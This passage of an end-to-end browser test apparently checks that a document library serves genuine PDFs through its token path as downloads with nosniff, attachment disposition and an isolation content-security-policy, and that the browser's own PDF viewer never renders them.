    const res = await api.get(tokenURL(FILE_GENUINE_PDF));
    expect(res.status()).toBe(200);
    const h = res.headers();
    expect(h['content-type']).toBe(TYPE_PDF);
    expect(h['x-content-type-options']).toBe('nosniff');
    expect(
      h['content-disposition'],
      'FR-018: PDF bytes are fetched by PDF.js over the authenticated path; the token path must never hand a PDF to the browser as a document',
    ).toMatch(/^attachment/);
    expect(h['content-security-policy']).toBe(ISOLATION_POLICY);
    // NON-VACUITY: these really are PDF bytes, so "the viewer did not mount"
    // below cannot be explained by the file being something else entirely.
    expect((await res.body()).subarray(0, 5).toString('latin1')).toBe('%PDF-');

    const downloads: string[] = [];
    page.on('download', (d) => downloads.push(d.suggestedFilename()));
    await page.goto(tokenHref(FILE_GENUINE_PDF)).catch(() => undefined);

    expect(downloads, 'an attachment must download rather than render').toContain(FILE_GENUINE_PDF);
    expect(
      browserPdfViewerFrames(page),
      'the browser\'s own PDF viewer received a Library PDF — `.pdf` must not be inline (§10.4, FR-018)',
    ).toEqual([]);
  });
});
